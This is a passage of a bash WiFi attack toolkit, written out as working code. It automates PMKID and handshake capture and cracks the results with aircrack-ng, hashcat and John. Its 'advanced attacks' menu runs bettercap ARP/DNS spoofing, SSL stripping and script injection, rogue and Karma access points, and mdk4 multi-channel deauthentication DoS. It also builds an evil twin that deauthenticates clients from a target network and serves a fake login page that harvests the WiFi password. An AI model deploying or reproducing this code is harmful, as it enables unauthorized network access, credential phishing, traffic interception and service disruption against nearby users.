        pause
        return
    fi

    local timestamp=$(get_timestamp)
    local capture_file="$LOGS_DIR/captures/pmkid_${timestamp}.pcapng"
    mkdir -p "$LOGS_DIR/captures"

    echo -e "${YELLOW}[*] Starting PMKID capture on $interface${NC}"
    echo -e "${YELLOW}[*] This attack does NOT require connected clients${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop capture${NC}"
    echo ""

    read -p "Enter target BSSID (or leave empty for all): " target_bssid

    if [[ -n "$target_bssid" ]]; then
        local filter_file=$(mktemp)
        echo "$target_bssid" | tr -d ':' > "$filter_file"
        hcxdumptool -i "$interface" -o "$capture_file" --filterlist_ap="$filter_file" --filtermode=2
        rm -f "$filter_file"
    else
        hcxdumptool -i "$interface" -o "$capture_file" --enable_status=1
    fi

    if [[ -f "$capture_file" ]]; then
        local hash_file="$LOGS_DIR/captures/pmkid_${timestamp}.hc22000"
        hcxpcapngtool "$capture_file" -o "$hash_file" 2>/dev/null

        if [[ -s "$hash_file" ]]; then
            local count=$(wc -l < "$hash_file")
            success "Captured $count PMKID hash(es)!"
            echo -e "${WHITE}Hash file: $hash_file${NC}"
            echo -e "${YELLOW}[*] Crack with: hashcat -m 22000 $hash_file <wordlist>${NC}"
        else
            warning "No PMKID hashes extracted from capture"
        fi
    fi

    pause
}

# Verify handshake file
verify_handshake() {
    clear
    echo -e "${BLUE}Verify Handshake${NC}"
    echo -e "${GRAY}================${NC}"

    echo -e "${WHITE}Handshake files in captures directory:${NC}"
    echo ""
    local cap_files=()
    local i=0
    for f in "$LOGS_DIR/captures"/*.cap "$LOGS_DIR/captures"/*-clean.cap; do
        [[ -f "$f" ]] || continue
        i=$((i + 1))
        cap_files+=("$f")
        local size=$(get_file_size "$f")
        echo -e "${CYAN}[$i]${NC} $(basename "$f") ${GRAY}($size)${NC}"
    done

    if [[ $i -eq 0 ]]; then
        echo -e "${YELLOW}[!] No capture files found${NC}"
        echo -e "${YELLOW}[!] Capture a handshake first (option 1)${NC}"
        pause
        return
    fi

    echo ""
    read -p "Select file (1-$i) or enter path: " selection

    local cap_file=""
    if [[ "$selection" =~ ^[0-9]+$ && $selection -ge 1 && $selection -le $i ]]; then
        cap_file="${cap_files[$((selection - 1))]}"
    elif [[ -f "$selection" ]]; then
        cap_file="$selection"
    else
        echo -e "${RED}[!] Invalid selection${NC}"
        pause
        return
    fi

    echo -e "${YELLOW}[*] Verifying: $(basename "$cap_file")${NC}"
    echo ""

    local result=$(aircrack-ng "$cap_file" 2>&1)
    echo "$result"
    echo ""

    if echo "$result" | grep -q "1 handshake"; then
        success "Valid handshake found!"
    elif echo "$result" | grep -q "No networks found"; then
        warning "No handshake in this file"
    else
        warning "Handshake verification inconclusive"
    fi

    pause
}

# Crack with aircrack-ng
crack_aircrack() {
    clear
    echo -e "${BLUE}Crack with Aircrack-ng${NC}"
    echo -e "${GRAY}======================${NC}"

    read -p "Enter path to capture file (.cap): " cap_file
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        pause
        return
    fi

    local wordlist="${WORDLIST_PATH:-/usr/share/wordlists/rockyou.txt}"
    read -p "Wordlist [$wordlist]: " custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"

    if [[ ! -f "$wordlist" ]]; then
        if [[ -f "${wordlist}.gz" ]]; then
            echo -e "${YELLOW}[*] Decompressing wordlist...${NC}"
            gunzip -k "${wordlist}.gz"
        else
            echo -e "${RED}[!] Wordlist not found: $wordlist${NC}"
            pause
            return
        fi
    fi

    echo -e "${YELLOW}[*] Starting aircrack-ng...${NC}"
    echo -e "${YELLOW}[*] Capture: $cap_file${NC}"
    echo -e "${YELLOW}[*] Wordlist: $wordlist${NC}"
    echo ""

    aircrack-ng -w "$wordlist" "$cap_file"

    pause
}

# Crack with hashcat
crack_hashcat() {
    clear
    echo -e "${BLUE}Crack with Hashcat (GPU)${NC}"
    echo -e "${GRAY}========================${NC}"

    if ! command -v hashcat &>/dev/null; then
        echo -e "${RED}[!] hashcat not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install hashcat${NC}"
        pause
        return
    fi

    echo -e "${WHITE}Input format:${NC}"
    echo -e "${CYAN}[1]${NC} .hc22000 file (WPA-PBKDF2-PMKID+EAPOL)"
    echo -e "${CYAN}[2]${NC} .cap file (auto-convert)"
    echo ""

    read -p "Select format: " format_choice
    local hash_file=""

    case $format_choice in
        1)
            read -p "Enter path to .hc22000 file: " hash_file
            ;;
        2)
            read -p "Enter path to .cap file: " cap_file
            if [[ -f "$cap_file" ]]; then
                hash_file="${cap_file%.cap}.hc22000"
                if command -v hcxpcapngtool &>/dev/null; then
                    hcxpcapngtool "$cap_file" -o "$hash_file" 2>/dev/null
                elif command -v cap2hccapx &>/dev/null; then
                    local hccapx="${cap_file%.cap}.hccapx"
                    cap2hccapx "$cap_file" "$hccapx"
                    hash_file="$hccapx"
                else
                    echo -e "${RED}[!] No conversion tool found (need hcxtools)${NC}"
                    pause
                    return
                fi
            fi
            ;;
        *)
            echo -e "${RED}[!] Invalid option${NC}"
            pause
            return
            ;;
    esac

    if [[ ! -f "$hash_file" ]]; then
        echo -e "${RED}[!] Hash file not found${NC}"
        pause
        return
    fi

    local wordlist="${WORDLIST_PATH:-/usr/share/wordlists/rockyou.txt}"
    read -p "Wordlist [$wordlist]: " custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"

    echo ""
    echo -e "${WHITE}Attack mode:${NC}"
    echo -e "${CYAN}[1]${NC} Dictionary attack"
    echo -e "${CYAN}[2]${NC} Dictionary + rules"
    echo -e "${CYAN}[3]${NC} Brute force (mask)"
    echo -e "${CYAN}[4]${NC} Combinator attack"
    echo ""

    read -p "Select mode: " attack_mode

    local hash_mode="22000"
    [[ "$hash_file" == *.hccapx ]] && hash_mode="2500"

    case $attack_mode in
        1)
            echo -e "${YELLOW}[*] Starting hashcat dictionary attack...${NC}"
            hashcat -m "$hash_mode" -a 0 "$hash_file" "$wordlist" --status --status-timer=10
            ;;
        2)
            echo -e "${WHITE}Rule files:${NC}"
            echo -e "${CYAN}[1]${NC} best64.rule (fast)"
            echo -e "${CYAN}[2]${NC} rockyou-30000.rule (thorough)"
            echo -e "${CYAN}[3]${NC} dive.rule (comprehensive)"
            echo -e "${CYAN}[4]${NC} Custom rule file"
            echo ""
            read -p "Select rule: " rule_choice

            local rule_file=""
            case $rule_choice in
                1) rule_file="/usr/share/hashcat/rules/best64.rule" ;;
                2) rule_file="/usr/share/hashcat/rules/rockyou-30000.rule" ;;
                3) rule_file="/usr/share/hashcat/rules/dive.rule" ;;
                4) read -p "Enter rule file path: " rule_file ;;
            esac

            if [[ -f "$rule_file" ]]; then
                hashcat -m "$hash_mode" -a 0 "$hash_file" "$wordlist" -r "$rule_file" --status --status-timer=10
            else
                echo -e "${RED}[!] Rule file not found${NC}"
            fi
            ;;
        3)
            echo -e "${WHITE}Common masks:${NC}"
            echo -e "${CYAN}[1]${NC} ?d?d?d?d?d?d?d?d        (8-digit numbers)"
            echo -e "${CYAN}[2]${NC} ?l?l?l?l?l?l?l?l        (8 lowercase)"
            echo -e "${CYAN}[3]${NC} ?u?l?l?l?l?l?d?d        (Name + 2 digits)"
            echo -e "${CYAN}[4]${NC} Custom mask"
            echo ""
            read -p "Select mask: " mask_choice

            local mask=""
            case $mask_choice in
                1) mask="?d?d?d?d?d?d?d?d" ;;
                2) mask="?l?l?l?l?l?l?l?l" ;;
                3) mask="?u?l?l?l?l?l?d?d" ;;
                4) read -p "Enter mask: " mask ;;
            esac

            if [[ -n "$mask" ]]; then
                hashcat -m "$hash_mode" -a 3 "$hash_file" "$mask" --status --status-timer=10
            fi
            ;;
        4)
            read -p "Enter second wordlist: " wordlist2
            if [[ -f "$wordlist2" ]]; then
                hashcat -m "$hash_mode" -a 1 "$hash_file" "$wordlist" "$wordlist2" --status --status-timer=10
            else
                echo -e "${RED}[!] Second wordlist not found${NC}"
            fi
            ;;
    esac

    pause
}

# Crack with John the Ripper
crack_john() {
    clear
    echo -e "${BLUE}Crack with John the Ripper${NC}"
    echo -e "${GRAY}==========================${NC}"

    if ! command -v john &>/dev/null; then
        echo -e "${RED}[!] John the Ripper not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install john${NC}"
        pause
        return
    fi

    read -p "Enter path to capture file (.cap): " cap_file
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        pause
        return
    fi

    # Convert to john format
    local john_file="${cap_file%.cap}.john"
    if command -v wpapcap2john &>/dev/null; then
        wpapcap2john "$cap_file" > "$john_file" 2>/dev/null
    elif command -v hcxpcapngtool &>/dev/null; then
        hcxpcapngtool "$cap_file" -o "${cap_file%.cap}.hc22000" 2>/dev/null
        john_file="${cap_file%.cap}.hc22000"
    else
        echo -e "${RED}[!] No conversion tool available${NC}"
        pause
        return
    fi

    local wordlist="${WORDLIST_PATH:-/usr/share/wordlists/rockyou.txt}"
    read -p "Wordlist [$wordlist]: " custom_wordlist
    wordlist="${custom_wordlist:-$wordlist}"

    echo -e "${YELLOW}[*] Starting John the Ripper...${NC}"
    john --wordlist="$wordlist" "$john_file"

    echo ""
    echo -e "${YELLOW}[*] Results:${NC}"
    john --show "$john_file"

    pause
}

# Convert handshake formats
convert_handshake() {
    clear
    echo -e "${BLUE}Convert Handshake Format${NC}"
    echo -e "${GRAY}========================${NC}"

    read -p "Enter path to capture file: " input_file
    if [[ ! -f "$input_file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        pause
        return
    fi

    echo ""
    echo -e "${WHITE}Convert to:${NC}"
    echo -e "${CYAN}[1]${NC} .hc22000 (hashcat WPA)"
    echo -e "${CYAN}[2]${NC} .hccapx (hashcat legacy)"
    echo -e "${CYAN}[3]${NC} Clean .cap (wpaclean)"
    echo ""

    read -p "Select format: " choice

    case $choice in
        1)
            local output="${input_file%.*}.hc22000"
            if command -v hcxpcapngtool &>/dev/null; then
                hcxpcapngtool "$input_file" -o "$output" 2>/dev/null
                [[ -s "$output" ]] && success "Converted to: $output" || warning "Conversion produced empty output"
            else
                echo -e "${RED}[!] hcxpcapngtool not found (install hcxtools)${NC}"
            fi
            ;;
        2)
            local output="${input_file%.*}.hccapx"
            if command -v cap2hccapx &>/dev/null; then
                cap2hccapx "$input_file" "$output"
                [[ -s "$output" ]] && success "Converted to: $output" || warning "Conversion failed"
            else
                echo -e "${RED}[!] cap2hccapx not found (install hcxtools)${NC}"
            fi
            ;;
        3)
            local output="${input_file%.*}-clean.cap"
            wpaclean "$output" "$input_file" 2>/dev/null
            [[ -s "$output" ]] && success "Cleaned to: $output" || warning "Cleaning failed"
            ;;
    esac

    pause
}

# Manage wordlists
manage_wordlists() {
    clear
    echo -e "${BLUE}Wordlist Manager${NC}"
    echo -e "${GRAY}================${NC}"

    echo -e "${WHITE}Wordlist Options:${NC}"
    echo -e "${CYAN}[1]${NC} List available wordlists"
    echo -e "${CYAN}[2]${NC} Decompress rockyou.txt.gz"
    echo -e "${CYAN}[3]${NC} Generate custom wordlist (crunch)"
    echo -e "${CYAN}[4]${NC} Merge wordlists"
    echo -e "${CYAN}[5]${NC} Sort and deduplicate wordlist"
    echo ""

    read -p "Select option: " choice

    case $choice in
        1)
            echo ""
            echo -e "${WHITE}System wordlists:${NC}"
            for wl in /usr/share/wordlists/*; do
                [[ -e "$wl" ]] || continue
                echo -e "  ${CYAN}$(basename "$wl")${NC} ${GRAY}($(get_file_size "$wl"))${NC}"
            done
            echo ""
            echo -e "${WHITE}SecLists (if installed):${NC}"
            if [[ -d "/usr/share/seclists" ]]; then
                ls /usr/share/seclists/Passwords/ 2>/dev/null | head -10
                echo -e "${GRAY}  ...and more${NC}"
            else
                echo -e "${YELLOW}  [!] Not installed. Install with: sudo apt install seclists${NC}"
            fi
            ;;
        2)
            if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
                echo -e "${YELLOW}[*] Decompressing rockyou.txt.gz...${NC}"
                gunzip -k /usr/share/wordlists/rockyou.txt.gz
                success "Decompressed to /usr/share/wordlists/rockyou.txt"
            elif [[ -f "/usr/share/wordlists/rockyou.txt" ]]; then
                echo -e "${GREEN}[✓] rockyou.txt already decompressed${NC}"
            else
                echo -e "${RED}[!] rockyou.txt not found${NC}"
            fi
            ;;
        3)
            if ! command -v crunch &>/dev/null; then
                echo -e "${RED}[!] crunch not found. Install with: sudo apt install crunch${NC}"
            else
                read -p "Min length: " min_len
                read -p "Max length: " max_len
                read -p "Character set [abcdefghijklmnopqrstuvwxyz0123456789]: " charset
                charset="${charset:-abcdefghijklmnopqrstuvwxyz0123456789}"
                read -p "Output file: " output_file

                echo -e "${YELLOW}[*] Generating wordlist...${NC}"
                crunch "$min_len" "$max_len" "$charset" -o "$output_file"
                [[ -f "$output_file" ]] && success "Wordlist saved to $output_file"
            fi
            ;;
        4)
            read -p "Enter wordlist paths (space-separated): " -a lists
            read -p "Output file: " output_file
            cat "${lists[@]}" 2>/dev/null | sort -u > "$output_file"
            [[ -s "$output_file" ]] && success "Merged $(wc -l < "$output_file") unique words to $output_file"
            ;;
        5)
            read -p "Enter wordlist path: " wl_file
            if [[ -f "$wl_file" ]]; then
                local before=$(wc -l < "$wl_file")
                sort -u "$wl_file" -o "$wl_file"
                local after=$(wc -l < "$wl_file")
                success "Deduplicated: $before -> $after entries (removed $((before - after)) duplicates)"
            fi
            ;;
    esac

    pause
}

# ══════════════════════════════════════════════════════════════
# Advanced Attacks Menu (Main Menu Option 7)
# ══════════════════════════════════════════════════════════════

advanced_menu() {
    while true; do
        clear
        echo -e "${BLUE}┌─────────────────────────────────────────────────────────────────┐${NC}"
        echo -e "${BLUE}│${WHITE}                  ADVANCED ATTACKS                       ${BLUE}│${NC}"
        echo -e "${BLUE}├─────────────────────────────────────────────────────────────────┤${NC}"
        echo -e "${BLUE}│ ${CYAN}[1]${WHITE} WPS PIN Recovery          ${GRAY}Reaver / Bully attacks${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[2]${WHITE} Deauthentication          ${GRAY}Targeted / broadcast${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[3]${WHITE} MITM Attack               ${GRAY}Man-in-the-middle setup${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[4]${WHITE} Rogue Access Point        ${GRAY}Fake AP with hostapd${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[5]${WHITE} Karma Attack              ${GRAY}Auto-respond to probes${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[6]${WHITE} Jamming Detection         ${GRAY}Detect WiFi jammers${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[7]${WHITE} Channel Hopping DoS       ${GRAY}Multi-channel deauth${BLUE}│${NC}"
        echo -e "${BLUE}│ ${CYAN}[0]${WHITE} Back to Main Menu         ${GRAY}Return${BLUE}│${NC}"
        echo -e "${BLUE}└─────────────────────────────────────────────────────────────────┘${NC}"
        echo ""

        read -p "Select an option: " choice

        case $choice in
            1) wps_attacks ;;
            2) dos_attacks ;;
            3) mitm_attack ;;
            4) rogue_ap ;;
            5) karma_attack ;;
            6) jamming_detection ;;
            7) channel_hop_dos ;;
            0) break ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                sleep 2
                ;;
        esac
    done
}

# MITM attack setup
mitm_attack() {
    clear
    echo -e "${BLUE}Man-in-the-Middle Attack${NC}"
    echo -e "${GRAY}========================${NC}"

    if ! command -v bettercap &>/dev/null; then
        echo -e "${RED}[!] bettercap not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install bettercap${NC}"
        pause
        return
    fi

    echo -e "${WHITE}MITM Options:${NC}"
    echo -e "${CYAN}[1]${NC} ARP spoofing + sniffing"
    echo -e "${CYAN}[2]${NC} DNS spoofing"
    echo -e "${CYAN}[3]${NC} SSL stripping"
    echo -e "${CYAN}[4]${NC} Packet injection"
    echo ""

    read -p "Select option: " choice

    # Get internet interface
    local iface=$(get_internet_interface)

    if [[ -z "$iface" ]]; then
        echo -e "${YELLOW}[!] No internet interface detected${NC}"
        iface=$(select_internet_interface)

        if [[ -z "$iface" ]]; then
            error "No internet interface selected. MITM attacks require internet connectivity."
            pause
            return
        fi
    fi

    echo -e "${GREEN}[✓] Using internet interface: $iface${NC}"
    echo ""

    case $choice in
        1)
            echo -e "${YELLOW}[*] Starting ARP spoof + network sniffing...${NC}"
            echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
            bettercap -iface "$iface" -eval "net.probe on; net.sniff on; set arp.spoof.fullduplex true; arp.spoof on"
            ;;
        2)
            read -p "Enter domain to spoof: " target_domain
            read -p "Redirect to IP: " redirect_ip
            echo -e "${YELLOW}[*] Starting DNS spoof for $target_domain -> $redirect_ip${NC}"
            bettercap -iface "$iface" -eval "set dns.spoof.domains $target_domain; set dns.spoof.address $redirect_ip; dns.spoof on; arp.spoof on"
            ;;
        3)
            echo -e "${YELLOW}[*] Starting SSL strip attack...${NC}"
            echo -e "${RED}[!] Many modern sites use HSTS - effectiveness varies${NC}"
            bettercap -iface "$iface" -eval "set http.proxy.sslstrip true; http.proxy on; arp.spoof on; net.sniff on"
            ;;
        4)
            echo -e "${YELLOW}[*] Starting packet injection mode...${NC}"
            bettercap -iface "$iface" -eval "net.probe on; net.sniff on; set http.proxy.injectjs alert('injected'); http.proxy on; arp.spoof on"
            ;;
    esac

    pause
}

# Rogue access point
rogue_ap() {
    clear
    echo -e "${BLUE}Rogue Access Point${NC}"
    echo -e "${GRAY}==================${NC}"

    if ! command -v hostapd &>/dev/null; then
        echo -e "${RED}[!] hostapd not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install hostapd${NC}"
        pause
        return
    fi

    local interface="$(get_selected_or_first_interface)"

    if [[ -z "$interface" ]]; then
        error "No wireless interfaces found"
        pause
        return
    fi

    # Get internet interface for NAT
    local internet=$(get_internet_interface)

    if [[ -z "$internet" ]]; then
        echo -e "${YELLOW}[!] No internet interface detected${NC}"
        internet=$(select_internet_interface)

        if [[ -z "$internet" ]]; then
            error "No internet interface selected. Rogue AP requires internet for NAT."
            pause
            return
        fi
    fi

    echo -e "${GREEN}[✓] Using internet interface: $internet${NC}"
    echo ""

    read -p "SSID for rogue AP: " rogue_ssid
    read -p "Channel [6]: " rogue_channel
    rogue_channel="${rogue_channel:-6}"

    echo -e "${WHITE}Authentication:${NC}"
    echo -e "${CYAN}[1]${NC} Open (no password)"
    echo -e "${CYAN}[2]${NC} WPA2 with password"
    echo ""
    read -p "Select: " auth_choice

    local temp_dir=$(create_temp_dir)
    local hostapd_conf="$temp_dir/hostapd.conf"

    cat > "$hostapd_conf" << EOF
interface=$interface
driver=nl80211
ssid=$rogue_ssid
hw_mode=g
channel=$rogue_channel
wmm_enabled=0
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

    if [[ "$auth_choice" == "2" ]]; then
        read -p "WPA2 password (8+ chars): " rogue_pass
        cat >> "$hostapd_conf" << EOF
auth_algs=1
wpa=2
wpa_passphrase=$rogue_pass
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
EOF
    fi

    # Configure DHCP
    local dnsmasq_conf="$temp_dir/dnsmasq.conf"
    cat > "$dnsmasq_conf" << EOF
interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
EOF

    echo -e "${YELLOW}[*] Starting rogue AP: $rogue_ssid${NC}"

    # Configure interface
    ifconfig "$interface" 10.0.0.1 netmask 255.255.255.0 up

    # Enable IP forwarding and NAT
    echo 1 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -A POSTROUTING -o "$internet" -j MASQUERADE
    iptables -A FORWARD -i "$interface" -o "$internet" -j ACCEPT

    # Start services
    dnsmasq -C "$dnsmasq_conf" &
    local dnsmasq_pid=$!

    hostapd "$hostapd_conf"

    # Cleanup
    kill $dnsmasq_pid 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    iptables -t nat -D POSTROUTING -o "$internet" -j MASQUERADE 2>/dev/null
    iptables -D FORWARD -i "$interface" -o "$internet" -j ACCEPT 2>/dev/null
    clean_temp_dir "$temp_dir"

    pause
}

# Karma attack
karma_attack() {
    clear
    echo -e "${BLUE}Karma Attack${NC}"
    echo -e "${GRAY}============${NC}"

    echo -e "${WHITE}Karma responds to ALL probe requests, creating matching APs${NC}"
    echo -e "${YELLOW}[!] Devices will auto-connect to remembered networks${NC}"
    echo ""

    if command -v bettercap &>/dev/null; then
        local interface="$(get_selected_or_first_interface)"

    if [[ -z "$interface" ]]; then
        error "No wireless interfaces found"
        pause
        return
    fi
        echo -e "${YELLOW}[*] Starting Karma attack on $interface...${NC}"
        echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
        bettercap -iface "$interface" -eval "set wifi.ap.open true; wifi.recon on; wifi.ap"
    else
        echo -e "${RED}[!] bettercap required for Karma attack${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install bettercap${NC}"
    fi

    pause
}

# Jamming detection
jamming_detection() {
    clear
    echo -e "${BLUE}WiFi Jamming Detection${NC}"
    echo -e "${GRAY}======================${NC}"

    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi

    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode required${NC}"
        pause
        return
    fi

    echo -e "${YELLOW}[*] Monitoring for jamming activity on $interface${NC}"
    echo -e "${YELLOW}[*] Watching for unusual deauth/disassoc frame rates${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"
    echo ""

    # Monitor deauth frames
    tcpdump -i "$interface" -e -c 500 'type mgt subtype deauth or type mgt subtype disassoc' 2>/dev/null | \
    while read -r line; do
        echo -e "${RED}[DEAUTH]${NC} $line"
    done

    pause
}

# Channel hopping DoS
channel_hop_dos() {
    clear
    echo -e "${BLUE}Channel Hopping DoS${NC}"
    echo -e "${GRAY}===================${NC}"

    local interface=$(get_monitor_interface)

    if [[ -z "$interface" ]]; then
        error "No monitor mode interface found. Please enable monitor mode first."
        pause
        return
    fi

    if ! is_monitor_mode "$interface"; then
        echo -e "${RED}[!] Monitor mode required${NC}"
        pause
        return
    fi

    if ! command -v mdk4 &>/dev/null; then
        echo -e "${RED}[!] mdk4 not found${NC}"
        echo -e "${YELLOW}[!] Install with: sudo apt install mdk4${NC}"
        pause
        return
    fi

    read -p "Enter target BSSID: " target_bssid
    read -p "Channels to attack (comma-separated, e.g. 1,6,11): " channels

    echo -e "${YELLOW}[*] Starting multi-channel deauth...${NC}"
    echo -e "${YELLOW}[*] Target: $target_bssid${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}"

    if [[ -n "$target_bssid" ]]; then
        local target_file=$(mktemp)
        echo "$target_bssid" > "$target_file"
        mdk4 "$interface" d -b "$target_file" -c "${channels//,/ }"
        rm -f "$target_file"
    else
        mdk4 "$interface" d -c "${channels//,/ }"
    fi

    pause
}

# ══════════════════════════════════════════════════════════════
# Evil Twin Infrastructure (used by captive-portal.sh)
# ══════════════════════════════════════════════════════════════

# Create basic captive portal HTML
create_basic_portal() {
    local portal_dir="$1"
    local ssid="$2"

    cat > "$portal_dir/index.html" << EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$ssid - WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, sans-serif; background: #f0f2f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
        h1 { font-size: 22px; margin-bottom: 10px; color: #1a1a1a; }
        p { color: #65676b; margin-bottom: 24px; font-size: 14px; }
        input { width: 100%; padding: 12px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; margin-bottom: 16px; }
        input:focus { outline: none; border-color: #1877f2; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #166fe5; }
    </style>
</head>
<body>
    <div class="container">
        <h1>$ssid</h1>
        <p>Enter the network password to connect</p>
        <form method="POST" action="check.htm">
            <input type="password" name="password" placeholder="WiFi Password" required autocomplete="off">
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>
EOF
}

# Start Evil Twin attack infrastructure
start_evil_twin_attack() {
    local interface="$1"
    local monitor_interface="$2"
    local target_bssid="$3"
    local target_channel="$4"
    local target_essid="$5"
    local portal_dir="$6"

    local temp_dir=$(create_temp_dir)

    # Determine HT capabilities based on channel (HT40 only on 1-9 for 2.4GHz)
    local ht_capab="[SHORT-GI-20][SHORT-GI-40][DSSS_CCK-40]"
    if [[ $target_channel -le 9 ]]; then
        ht_capab="[SHORT-GI-20][SHORT-GI-40][HT40+][DSSS_CCK-40]"
    fi

    # hostapd config - open network for captive portal
    cat > "$temp_dir/hostapd.conf" << EOF
interface=$interface
driver=nl80211
ssid=$target_essid
hw_mode=g
channel=$target_channel
beacon_int=100
dtim_period=2
max_num_sta=255
rts_threshold=2347
fragm_threshold=2346
wmm_enabled=1
macaddr_acl=0
auth_algs=1
ieee80211n=1
ignore_broadcast_ssid=0
disassoc_low_ack=1
EOF

    # dnsmasq config - provide DHCP and DNS with internet access
    cat > "$temp_dir/dnsmasq.conf" << EOF
interface=$interface
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
# Forward DNS to Google DNS for real internet access
server=8.8.8.8
server=8.8.4.4
# Redirect common login detection URLs to captive portal
address=/connectivitycheck.gstatic.com/10.0.0.1
address=/clients3.google.com/10.0.0.1
address=/captive.apple.com/10.0.0.1
address=/www.msftconnecttest.com/10.0.0.1
log-queries
log-dhcp
EOF

    # lighttpd config
    cat > "$temp_dir/lighttpd.conf" << EOF
server.document-root = "$portal_dir"
server.port = 80
server.bind = "10.0.0.1"
mimetype.assign = (
    ".html" => "text/html",
    ".css" => "text/css",
    ".js" => "application/javascript",
    ".png" => "image/png",
    ".jpg" => "image/jpeg"
)
server.error-handler-404 = "/index.html"
EOF

    # Kill any existing dnsmasq/hostapd processes that might interfere
    pkill -f "dnsmasq" 2>/dev/null
    pkill -f "hostapd" 2>/dev/null
    pkill -f "lighttpd" 2>/dev/null
    sleep 2

    # Prepare interface - bring it down first, then up with proper config
    ifconfig "$interface" down 2>/dev/null
    sleep 1
    ifconfig "$interface" up 2>/dev/null
    sleep 1
    
    # Configure interface with IP
    ifconfig "$interface" 10.0.0.1 netmask 255.255.255.0 up 2>/dev/null
    ip link set "$interface" mtu 1500 2>/dev/null
    
    # Wait for interface to be fully ready and stable
    sleep 3
    # Verify interface is up
    if ! ifconfig "$interface" | grep -q "UP"; then
        error "Interface failed to come up"
    fi

    # Set up internet connectivity (NAT)
    echo -e "${YELLOW}[*] Setting up internet connectivity...${NC}"

    # Get internet interface
    local internet_iface=$(get_internet_interface)
    if [[ -z "$internet_iface" ]]; then
        echo -e "${YELLOW}[!] No internet interface detected${NC}"
        internet_iface=$(select_internet_interface)
    fi

    if [[ -n "$internet_iface" ]]; then
        echo -e "${GREEN}[✓] Using internet interface: $internet_iface${NC}"

        # Enable IP forwarding
        echo 1 > /proc/sys/net/ipv4/ip_forward

        # Flush existing iptables rules for this interface
        iptables -t nat -D POSTROUTING -o "$internet_iface" -j MASQUERADE 2>/dev/null
        iptables -D FORWARD -i "$interface" -o "$internet_iface" -j ACCEPT 2>/dev/null
        iptables -D FORWARD -i "$internet_iface" -o "$interface" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null

        # Set up NAT
        iptables -t nat -A POSTROUTING -o "$internet_iface" -j MASQUERADE
        iptables -A FORWARD -i "$interface" -o "$internet_iface" -j ACCEPT
        iptables -A FORWARD -i "$internet_iface" -o "$interface" -m state --state RELATED,ESTABLISHED -j ACCEPT

        echo -e "${GREEN}[✓] Internet connectivity enabled${NC}"
        echo -e "${CYAN}[*] Victims will have full internet access${NC}"
    else
        echo -e "${YELLOW}[!] No internet interface - running captive portal only${NC}"
    fi
    sleep 1

    echo -e "${YELLOW}[*] Starting deauthentication against target...${NC}"
    aireplay-ng --deauth 0 -a "$target_bssid" "$monitor_interface" &>/dev/null &
    local deauth_pid=$!

    echo -e "${YELLOW}[*] Starting rogue AP...${NC}"
    hostapd "$temp_dir/hostapd.conf" &
    local ap_pid=$!
    
    # Wait for AP to fully initialize - critical for interface stability
    sleep 4

    echo -e "${YELLOW}[*] Starting DNS server...${NC}"
    dnsmasq -C "$temp_dir/dnsmasq.conf" &
    local dns_pid=$!
    sleep 2

    echo -e "${YELLOW}[*] Starting web server...${NC}"
    lighttpd -D -f "$temp_dir/lighttpd.conf" &
    local web_pid=$!
    sleep 1

    echo ""
    echo -e "${GREEN}[✓] Evil Twin running!${NC}"
    echo -e "${WHITE}  AP SSID:    $target_essid${NC}"
    echo -e "${WHITE}  Portal:     http://10.0.0.1${NC}"
    echo -e "${WHITE}  Credential log: $LOGS_DIR/credentials/${NC}"
    echo ""
    echo -e "${YELLOW}[*] Press Enter to stop attack...${NC}"
    read

    # Cleanup - kill processes in reverse order and restore interface
    kill $web_pid $dns_pid $ap_pid $deauth_pid 2>/dev/null
    pkill -f "lighttpd" 2>/dev/null
    pkill -f "dnsmasq" 2>/dev/null
